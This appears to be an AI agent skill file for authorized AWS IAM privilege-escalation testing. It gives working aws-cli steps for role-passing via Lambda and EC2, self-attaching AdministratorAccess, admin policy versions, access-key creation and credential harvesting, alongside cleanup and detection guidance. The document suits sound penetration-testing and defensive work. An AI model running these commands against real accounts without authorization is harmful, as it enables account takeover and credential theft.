---
name: iam-privesc
description: "Use when assessing AWS IAM privilege escalation paths during an authorized cloud assessment, bug bounty engagement, or lab exercise. Covers effective permission enumeration with SimulatePrincipalPolicy and the classic escalation primitives: iam:PassRole combined with Lambda or EC2 creation, iam:CreatePolicyVersion, iam:AttachUserPolicy and iam:AttachRolePolicy, sts:AssumeRole chains, and EC2 instance profile abuse using aws-cli 2.22 and Python 3.12. Use when you hold low-privilege AWS credentials and need to determine whether they can reach administrative access."
version: 1.0.0
domain: cloud
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [aws-enumeration, cloud-security-basics]
tools:
  - name: aws-cli
    version: "2.22"
  - name: Python
    version: "3.12"
---
IAM privilege escalation is the path from a low-privilege AWS
credential to administrative control of the account. The primitives
are well known: pass a powerful role to a new Lambda function or EC2
instance, attach a stronger policy to yourself, create a new policy
version, or hop through assumable roles. This skill covers the
authorized operator workflow: enumerate effective permissions,
identify which primitives are available, execute the escalation
safely in your own account or lab, and document the path. Use it
against your own accounts, in-scope bug bounty targets, and lab
environments only. Never escalate on accounts you do not have
written permission to test.

## Quick Workflow

1. Enumerate the starting principal: ARN, attached and inline
   policies, groups, and trust relationships.
2. Resolve EFFECTIVE permissions with SimulatePrincipalPolicy for
   the escalation-relevant actions (do not trust policy names).
3. List assumable roles: read trust policies and test
   `sts:AssumeRole` where allowed.
4. Match permissions against the known primitives below and pick
   the quietest path first.
5. Execute the escalation in your own account or lab, then confirm
   with `sts get-caller-identity` and a harmless privileged read.
6. Record the full chain: starting ARN, permissions used, commands
   run, resulting ARN.
7. Clean up every resource you created (functions, instances,
   policy versions, keys).
8. Report the path with the exact commands so the defender can
   reproduce and fix it.

## 1. Effective permission enumeration

Policy names lie; simulation tells the truth. Test the actions you
plan to use before building the attack.

```bash
ME=$(aws sts get-caller-identity --query Arn --output text)
echo "starting principal: $ME"

# Simulate the escalation-relevant actions in one call
aws iam simulate-principal-policy --policy-source-arn "$ME" \
  --action-names iam:PassRole lambda:CreateFunction lambda:UpdateFunctionCode \
    ec2:RunInstances iam:CreatePolicyVersion iam:AttachUserPolicy \
    iam:AttachRolePolicy sts:AssumeRole iam:CreateAccessKey \
    iam:PutUserPolicy iam:UpdateAssumeRolePolicy \
  --query 'EvaluationResults[].[EvalActionName,EvalDecision]' --output text
```

Also enumerate the raw policies so you can read conditions and
resource scoping that simulation summarizes:

```bash
# Inline and attached policies for the current user (adjust for roles)
aws iam list-user-policies --user-name <USER> --query 'PolicyNames' --output text
aws iam get-user-policy --user-name <USER> --policy-name <POLICY> \
  --query 'PolicyDocument'
```

## 2. AssumeRole chains

```bash
# Roles whose trust policy names your principal (needs iam:GetRole per role)
for r in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  trust=$(aws iam get-role --role-name "$r" \
    --query 'Role.AssumeRolePolicyDocument' --output text 2>/dev/null)
  echo "$r :: $(echo "$trust" | head -c 120)"
done

# Attempt the assume (only where the trust policy allows it)
aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/<ROLE> \
  --role-session-name test 2>&1 | head -20
```

Each assumed role is a NEW principal: re-run section 1 under the new
credentials, because the new role may unlock further hops.

## 3. Primitive: PassRole plus Lambda

`iam:PassRole` plus `lambda:CreateFunction` (or
`lambda:UpdateFunctionCode` on an existing function) lets you run
code as any role you are allowed to pass.

```bash
# Confirm the two halves
aws iam simulate-principal-policy --policy-source-arn "$ME" \
  --action-names iam:PassRole lambda:CreateFunction \
  --query 'EvaluationResults[].[EvalActionName,EvalDecision]' --output text

# Which roles can you pass? Check the resource scope on iam:PassRole
aws iam get-user-policy --user-name <USER> --policy-name <POLICY> \
  --query 'PolicyDocument.Statement[?Action==`iam:PassRole`]'

# Lab-only execution sketch: create a function with the target role
# zip function.zip index.py   (handler runs aws sts get-caller-identity)
aws lambda create-function --function-name privesc-test \
  --runtime python3.12 --role arn:aws:iam::<ACCT>:role/<TARGET-ROLE> \
  --handler index.handler --zip-file fileb://function.zip
aws lambda invoke --function-name privesc-test /tmp/out.json \
  && cat /tmp/out.json

# Cleanup is mandatory
aws lambda delete-function --function-name privesc-test
```

## 4. Primitive: PassRole plus EC2

`iam:PassRole` plus `ec2:RunInstances` (with `iam:CreateInstanceProfile`
and `iam:AddRoleToInstanceProfile`, or an existing profile) puts the
target role's credentials on an instance you control.

```bash
# Create an instance profile holding the target role (lab only)
aws iam create-instance-profile --instance-profile-name test-profile
aws iam add-role-to-instance-profile \
  --instance-profile-name test-profile --role-name <TARGET-ROLE>
sleep 10  # propagation delay is real

aws ec2 run-instances --image-id ami-<ID> --instance-type t3.micro \
  --iam-instance-profile Name=test-profile \
  --user-data file:///tmp/userdata.sh --query 'Instances[0].InstanceId'

# From inside the instance, the role credentials appear in metadata
# (same IMDS calls as the aws-enumeration skill, section 1)

# Cleanup is mandatory
aws ec2 terminate-instances --instance-ids <ID>
aws iam remove-role-from-instance-profile \
  --instance-profile-name test-profile --role-name <TARGET-ROLE>
aws iam delete-instance-profile --instance-profile-name test-profile
```

## 5. Primitive: policy attachment and versioning

Direct policy edits are the shortest path when allowed.

```bash
# Attach the managed AdministratorAccess policy to yourself
aws iam attach-user-policy --user-name <USER> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Or create a new ADMIN policy version on a policy you can already use
aws iam create-policy-version \
  --policy-arn arn:aws:iam::<ACCT>:policy/<POLICY> \
  --policy-document file:///tmp/admin.json --set-as-default

# Inline policy version (no new managed policy needed)
aws iam put-user-policy --user-name <USER> --policy-name escalate \
  --policy-document file:///tmp/admin.json
```

Where `/tmp/admin.json` is `{"Version":"2012-10-17","Statement":
[{"Effect":"Allow","Action":"*","Resource":"*"}]}`. Use only in your
own account or lab, and remove the policy or version afterwards.

## 6. Primitive: credential creation

```bash
# Create an access key for a more powerful user you can administer
aws iam create-access-key --user-name <TARGET-USER> \
  --query 'AccessKey.{ID:AccessKeyId, Secret:SecretAccessKey}' --output text

# Update an existing login profile or attach a policy, then revert
aws iam attach-role-policy --role-name <ROLE> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Treat created credentials like live ammunition: use once, confirm,
delete immediately with `aws iam delete-access-key`.

## 7. Reading the trust policy for hidden doors

```bash
# Who can assume this role? Look for * principals and loose conditions
aws iam get-role --role-name <ROLE> \
  --query 'Role.AssumeRolePolicyDocument' | python3 -m json.tool

# Red flags: Principal "*", or Condition with aws:PrincipalArn * ,
# or sts:ExternalId missing on third-party roles
```

## 8. Full-chain documentation template

For the report, record each hop as: starting ARN, permission that
enabled the hop, exact command, resulting ARN, cleanup command.
A chain of three hops is three findings, not one; each hop is a
place the defender can break the chain.

## Edge cases

- `iam:PassRole` is scoped to specific role ARNs: you can only
  pass the listed roles, so enumerate the resource field, not just
  the action.
- IAM changes take time to propagate (usually seconds, sometimes
  minutes). If a fresh policy does not seem to work, wait and
  retry before concluding it failed.
- `simulate-principal-policy` does not evaluate resource-based
  policies or trust policies: a simulated Allow on
  `sts:AssumeRole` still needs the role's trust policy to name
  you. Test the real call.
- Permissions boundaries and SCPs can silently deny an action
  that the identity policy allows; simulation flags some of
  these, real calls confirm the rest.
- `lambda:UpdateFunctionCode` needs an EXISTING function you can
  write to: list functions first and check each function's own
  resource policy.
- In labs with `iam:CreatePolicyVersion`, the policy may already
  have five versions (the maximum): delete the oldest
  non-default version first with `iam:DeletePolicyVersion`.
- Session policies on assumed roles can strip permissions the
  role would otherwise grant; check how the role was assumed.

## Escalation

- No direct primitives: pivot to AssumeRole chains (section 2).
  Each hop re-rolls your permissions; enumerate again every hop.
- Role trust requires `sts:ExternalId` you do not know: look for
  the ID in code repos, CI variables, or documentation inside the
  scope; never brute force it.
- Blocked at IAM entirely: look at the data plane. Secrets
  Manager, SSM Parameter Store, and Lambda environment variables
  often hold credentials for OTHER principals with more power
  (read-only access may be enough, subject to scope).
- EC2 user-data scripts and Lambda environment variables are
  readable with `ec2:DescribeInstances` and
  `lambda:GetFunctionConfiguration`: harvest them for embedded
  credentials before attempting noisier primitives.
- Glue, SageMaker, and CloudFormation can also execute code as a
  passed role (`iam:PassRole` + `glue:CreateDevEndpoint`,
  `sagemaker:CreateNotebookInstance`,
  `cloudformation:CreateStack`): check simulation for those
  actions when Lambda and EC2 are denied.

## Detection and defender view

Defenders see IAM privilege escalation in CloudTrail management
events: `AttachUserPolicy`, `CreatePolicyVersion`,
`PutUserPolicy`, `CreateAccessKey`, `AssumeRole`, and
`UpdateAssumeRolePolicy`, each with caller ARN and source IP.
GuardDuty raises `PrivilegeEscalation:IAMUser/AdministrativePermissions`
when a user grants themselves administrative rights, plus
`Persistence:IAMUser/*` findings for new keys and policies.
Durable defenses are permissions boundaries on every human and
CI role, SCPs that deny `iam:*` outside a break-glass OU,
requiring MFA for IAM write actions, alerts on policy attachment
and access key creation, and regular access reviews of trust
policies. As the tester, execute escalations only in your own
account or lab unless the scope explicitly allows production,
clean up everything you create, and never leave a backdoor
policy, key, or user behind.

## Key references

- MITRE ATT&CK T1484 (Domain Policy Modification): policy
  attachment and version abuse.
- MITRE ATT&CK T1134 (Access Token Manipulation): AssumeRole and
  credential hopping.
- MITRE ATT&CK T1098.001 (Account Manipulation: Additional Cloud
  Credentials): creating access keys.
- MITRE ATT&CK T1078.004 (Valid Accounts: Cloud Accounts): using
  the escalated identity.
- Rhino Security Labs AWS privilege escalation research (the
  classic 21-method taxonomy this skill's primitives follow).
- AWS IAM SimulatePrincipalPolicy:
  https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_testing-iam.html
- AWS IAM best practices:
  https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
